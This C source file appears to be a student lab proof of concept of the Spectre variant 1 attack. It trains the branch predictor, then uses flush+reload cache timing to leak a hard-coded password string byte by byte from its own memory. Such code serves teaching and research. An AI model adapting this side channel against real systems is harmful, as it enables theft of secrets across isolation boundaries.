#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>

/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (150)
#define DELTA 1024

int size = 10;
static int hits[256];
unsigned int victim_array_size = 10;
uint8_t victim_array[10] = { 0,1,2,3,4,5,6,7,8,9 };
char* secret = "My password is cs3235project";
uint8_t array[256 * 4096];

void flushSideChannel()
{
    int i;
    // Write to array to bring it to RAM to prevent Copy-on-write
    for (i = 0; i < 256; i++) array[i * 4096 + DELTA] = 1;
    // Flush the values of the array from cache
    for (i = 0; i < 256; i++) _mm_clflush(&array[i * 4096 + DELTA]);
}


// Sandbox Function
uint8_t victim_code(size_t x)
{
    if (x < victim_array_size) {
        return victim_array[x];
    }
    else {
        return 0;
    }
}

void reloadSideChannelImproved()
{
    int i;
    volatile uint8_t* addr;
    register uint64_t time1, time2;
    int junk = 0;
    for (i = 1; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD)
            hits[i]++; /* if cache hit, add 1 for this value */
    }
}

void spectreAttack(size_t larger_x)
{
    int i;
    uint8_t s;
    for (i = 0; i < 256; i++) { _mm_clflush(&array[i * 4096 + DELTA]); }
    // Train the CPU to take the true branch inside victim().
    for (i = 0; i < 10; i++) {
        _mm_clflush(&victim_array_size);
        victim_code(i);
    }
    // Flush victim_array_size and array[] from the cache.
    _mm_clflush(&victim_array_size);
    for (i = 0; i < 256; i++) { _mm_clflush(&array[i * 4096 + DELTA]); }
    // Ask victim() to return the secret in out-of-order execution.
    s = victim_code(larger_x);
    array[s * 4096 + DELTA] += 88;
}


int main()
{
    int i, len = 100;
    uint8_t s;

    printf("\n");
    size_t larger_x = (size_t)(secret - (char*)victim_array);
    flushSideChannel();
    for (int j = 0; j < len; j++) {
        for (i = 0; i < 256; i++) hits[i] = 0;
        for (i = 0; i < 1000; i++) {
            spectreAttack(larger_x);
            reloadSideChannelImproved();
        }
        int max = 0;
        for (i = 0; i < 256; i++) {
            if (hits[max] < hits[i]) max = i;
        }
        printf("Reading secret value at %p = ", (void*)larger_x);
        printf("The secret value is %c\n", max);
        larger_x++;
    }
    return (0);
}
